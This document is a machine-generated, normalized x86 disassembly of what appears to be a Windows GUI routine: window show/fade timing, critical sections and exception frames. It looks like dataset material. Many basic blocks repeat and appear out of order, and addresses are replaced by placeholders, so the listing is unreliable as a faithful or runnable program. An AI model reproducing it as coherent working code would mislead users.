mov eax [ ebp - 0x4 ]
call sub_43bb10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4816f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_430438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4816fd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xec ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43bb10
push 0x4
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
call ShowWindow
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_481425
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48142c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov ebx eax
xor eax eax
push ebp
push sub_4814f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4814f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0xa
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov esi eax
xor eax eax
push ebp
push sub_4815ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4815f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_48142c
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
push 0x14
call Sleep
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xb
jne r-xdata
push ebp
call sub_4811b8
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
call sub_480e18
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_481425
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48142c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_4055f0
mov eax [ ebp - 0x4 ]
call sub_43bb10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4816f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_430438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4816fd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xec ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43bb10
push 0x4
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
call ShowWindow
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov ebx eax
xor eax eax
push ebp
push sub_4814f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4814f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x8 ] 0xa
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov esi eax
xor eax eax
push ebp
push sub_4815ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4815f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_4814f8
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x54 ] 0xffffffff
je r-xdata
push ebp
call sub_4811b8
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
call sub_480e18
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x278 ]
cmp eax [ edx + 0x54 ]
jbe r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov ebx eax
xor eax eax
push ebp
push sub_4814f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4814f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
call sub_480b94
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_4055f0
mov eax [ ebp - 0x4 ]
call sub_43bb10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4816f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_430438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4816fd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov esi eax
xor eax eax
push ebp
push sub_4815ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4815f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xec ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43bb10
push 0x4
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
call ShowWindow
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_481425
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48142c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
sub_4815f5
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
push 0x14
call Sleep
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
push ebp
call sub_4811b8
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
call sub_480e18
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov esi eax
xor eax eax
push ebp
push sub_4815ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4815f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_481675
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_4055f0
mov eax [ ebp - 0x4 ]
call sub_43bb10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4816f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_430438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4816fd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xec ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43bb10
push 0x4
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
call ShowWindow
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_481425
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48142c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_404644
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov ebx eax
xor eax eax
push ebp
push sub_4814f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4814f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0xa
sub_481778
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4055c0
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edi eax
mov [ ebx + 0x14 ] edi
mov eax edi
mov edx esi
call sub_4303e0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4817e4
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
cmp [ esi + 0xc ] 0x0
je r-xdata
lea eax [ esi + 0x14 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
xor edx edx
mov eax esi
call sub_481a44
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_481828
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43139c
mov edi esi
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
movzx eax [ ebx + 0x10 ]
mov [ edi + 0x10 ] al
movzx eax [ ebx + 0x11 ]
mov [ edi + 0x11 ] al
push 0x0
mov eax [ edi + 0x14 ]
xor ecx ecx
mov edx [ ebx + 0x14 ]
call sub_430c1c
mov eax [ ebx + 0x19 ]
mov [ edi + 0x19 ] eax
mov al [ ebx + 0x1d ]
mov [ edi + 0x1d ] al
movzx eax [ ebx + 0x1e ]
mov [ edi + 0x1e ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4818a4
push ebx
push esi
xor ecx ecx
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax ecx
pop esi
pop ebx
retn
mov ecx edx
mov edx esi
mov eax [ eax + 0x4 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x4c ]
mov ecx eax
sub_4818c4
push ebx
push esi
xor ecx ecx
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax ecx
pop esi
pop ebx
retn
mov ecx edx
mov edx esi
mov eax [ eax + 0x4 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x50 ]
mov ecx eax
sub_4818e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_408928
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x34 ]
sub_481910
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x19 ]
mov [ edi ] eax
mov al [ ebx + 0x1d ]
mov [ edi + 0x4 ] al
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx [ ebx + 0x4 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ esp ]
mov [ ebx + 0x19 ] eax
mov al [ esp + 0x4 ]
mov [ ebx + 0x1d ] al
sub_48199c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_430608
inc eax
je r-xdata
pop esi
pop ebx
retn
mov edx esi
xor ecx ecx
mov eax [ ebx + 0x14 ]
call sub_4307b0
sub_4819c0
push ebx
push esi
xor ecx ecx
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax ecx
pop esi
pop ebx
retn
mov ecx edx
mov edx esi
mov eax [ eax + 0x4 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx eax
sub_4819e0
push ebx
push esi
xor ecx ecx
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax ecx
pop esi
pop ebx
retn
mov ecx edx
mov edx esi
mov eax [ eax + 0x4 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx eax
sub_481a00
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov [ ebx + 0x8 ] esi
mov eax [ ebx + 0x4 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x52 ] 0x20
je r-xdata
mov dl 0x1
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_481a44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
cmp esi eax
je r-xdata
pop edi
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx [ ebx + 0x4 ]
call sub_43c510
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
mov eax [ ebx + 0x14 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_43c22c
mov edx [ ebx + 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc esi
xor edi edi
push 0x0
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4305a0
xor ecx ecx
mov edx 0xb054
call sub_472314
inc edi
dec esi
jne r-xdata
sub_481ab8
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
mov edx [ eax + 0x4 ]
cmp [ edx + 0x34 ] 0x0
je r-xdata
test [ edx + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov eax edx
mov edx 0xb058
call sub_472314
sub_481ae0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x19 ]
mov cl 0x5
call sub_404f08
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi ]
mov [ ebx + 0x19 ] eax
mov al [ esi + 0x4 ]
mov [ ebx + 0x1d ] al
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
lea ecx [ ebx + 0x19 ]
mov edx [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_481b14
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
movzx eax [ ebx + 0x1e ]
cmp ax [ esp ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x1e ] ax
mov [ ebx + 0x18 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb057
mov eax [ ebx + 0x4 ]
call sub_472314
sub_481b48
push ebx
push esi
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ecx edx
mov edx esi
mov eax [ eax + 0x4 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x6c ]
sub_481b64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_481bcb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481bd2
retn
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
call sub_47fea0
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_407e40
sub_485c0c
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx 0x64
mov edx [ rw-data ]
mov eax ebx
call sub_472314
cmp eax 0x64
sete al
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
sub_485c98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
call sub_43fb70
mov [ esi + 0x5 ] al
mov eax r-xdata
call sub_417244
cmp eax 0x60000
setae al
mov [ esi + 0x4 ] al
mov eax esi
call sub_48732c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_485d44
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
movzx eax bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
movzx eax bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_485db0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_485df8
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
test ebx 0x80000000
je r-xdata
mov eax ebx
jmp r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
and ebx 0x7fffffff
push ebx
movzx edx [ edi ]
mov eax esi
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_485e30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
